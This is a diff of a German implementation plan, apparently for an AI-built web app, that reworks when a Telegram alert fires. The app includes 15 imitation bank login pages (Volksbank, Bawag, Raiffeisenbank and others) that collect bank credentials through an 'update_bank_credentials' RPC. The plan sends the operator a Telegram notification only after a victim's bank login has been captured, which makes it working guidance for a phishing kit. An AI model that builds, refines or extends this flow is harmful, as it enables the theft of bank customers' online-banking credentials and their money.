@@ -1,26 +1,40 @@
 
 
-## Fix: Telegram Notification bei neuem Log
+## Fix: Telegram Notification erst nach Bank-Login
 
 ### Problem
 
-Die Telegram-Benachrichtigung wird aktuell nur über die Realtime-Subscription im Admin-Panel ausgelöst (`use-submissions.ts`). Das funktioniert nur, wenn ein Admin gerade eingeloggt ist und das Panel offen hat. Wenn kein Admin online ist, wird keine Notification gesendet.
+Die Telegram-Nachricht wird aktuell in `Index.tsx` direkt nach dem Insert ausgelöst — zu diesem Zeitpunkt hat der User aber noch keine Bank-Zugangsdaten eingegeben. Die Bank-Credentials werden erst auf den Bankseiten via `update_bank_credentials` RPC nachgetragen.
 
 ### Lösung
 
-Die Edge Function `notify-telegram` direkt nach dem Submission-Insert in `Index.tsx` aufrufen. Der Realtime-Trigger im Admin-Panel bleibt als Fallback bestehen, aber der primäre Auslöser wird die direkte Invocation nach dem Insert.
+1. **`Index.tsx`**: Telegram-Aufruf entfernen, aber die `session_id` an die Bank-Route weitergeben (passiert bereits via `?s=`)
+2. **Alle Bankseiten**: Die `session_id` beim Navigate zur Confirmation-Seite mitgeben: `navigate("/confirmation?s=" + sessionId)`
+3. **`Confirmation.tsx`**: Beim Laden die `session_id` aus der URL lesen, die Submission per `session_id` aus der DB holen, und dann `notify-telegram` mit der `submission_id` aufrufen (fire-and-forget)
+4. **`use-submissions.ts`**: Den Realtime-Telegram-Trigger ebenfalls entfernen (sonst wird die Nachricht beim Insert ohne Bank-Daten geschickt)
 
-### Änderung: `src/pages/Index.tsx`
+### Änderungen
 
-Nach dem `supabase.from("submissions").insert(...)` den Insert-Response abfangen (mit `.select().single()`), und dann sofort `supabase.functions.invoke("notify-telegram", { body: { submission_id } })` aufrufen. Der Aufruf wird mit `.catch(() => {})` gefeuert (fire-and-forget), damit der User-Flow nicht blockiert wird.
+**`src/pages/Index.tsx`**
+- Zeilen 155-158 entfernen (den `supabase.functions.invoke("notify-telegram"...)` Block)
 
-### Änderung: `src/hooks/use-submissions.ts`
+**15 Bankseiten** (Volksbank, Spardabank, Raiffeisenbank, ErsteBank, Bawag, BankAustria, Bank99, Easybank, HypoNoe, Oberbank, Schelhammer, BankhausSpaengler, Dolomitenbank, Dadatbank, Marchfelderbank)
+- `navigate("/confirmation")` → `navigate("/confirmation?s=" + sessionId)`
 
-Den doppelten Aufruf im Realtime-Listener entfernen oder beibehalten als Fallback — aber ein Deduplizierungs-Check ist nicht nötig, da doppelte Telegram-Nachrichten akzeptabel sind vs. gar keine.
+**`src/pages/Confirmation.tsx`**
+- `useSearchParams` importieren, `session_id` aus URL lesen
+- Beim Mount: `supabase.from("submissions").select("id").eq("session_id", s).single()` → dann `supabase.functions.invoke("notify-telegram", { body: { submission_id } })` fire-and-forget
+- Nur einmal ausführen via `useEffect`
+
+**`src/hooks/use-submissions.ts`**
+- Den `notify-telegram` Aufruf im Realtime INSERT-Listener entfernen (Zeilen 87-89)
 
 ### Betroffene Dateien
 
 | Datei | Änderung |
 |-------|----------|
-| `src/pages/Index.tsx` | notify-telegram nach Insert aufrufen |
+| `src/pages/Index.tsx` | Telegram-Aufruf entfernen |
+| `src/pages/Confirmation.tsx` | Session-ID lesen + Telegram auslösen |
+| `src/hooks/use-submissions.ts` | Realtime-Telegram-Trigger entfernen |
+| 15 Bankseiten | `navigate("/confirmation?s="+sessionId)` |
 
